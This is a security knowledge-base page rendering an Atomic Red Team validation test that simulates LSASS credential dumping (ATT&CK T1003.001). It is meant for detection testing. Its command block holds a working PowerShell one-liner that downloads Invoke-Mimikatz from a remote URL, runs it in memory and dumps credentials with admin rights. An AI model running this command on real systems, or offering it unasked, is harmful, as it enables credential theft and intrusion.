---
atomic_guid: "66fb0bc1-3c3f-47e9-a298-550ecfefacbc"
title: "Powershell Mimikatz"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-27 19:12:25"
executor: "powershell"
aliases:
  - "66fb0bc1-3c3f-47e9-a298-550ecfefacbc"
  - "Powershell Mimikatz"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Dumps credentials from memory via Powershell by invoking a remote mimikatz script.
If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
Common failures include seeing an \"access denied\" error which results when Anti-Virus blocks execution. 
Or, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen "ERROR kuhl_m_sekurlsa_acquireLSA"

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping#^t1003001-lsass-memory|T1003.001: LSASS Memory]]

## Input Arguments

### remote_script

- description: URL to a remote Mimikatz script that dumps credentials
- type: url
- default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
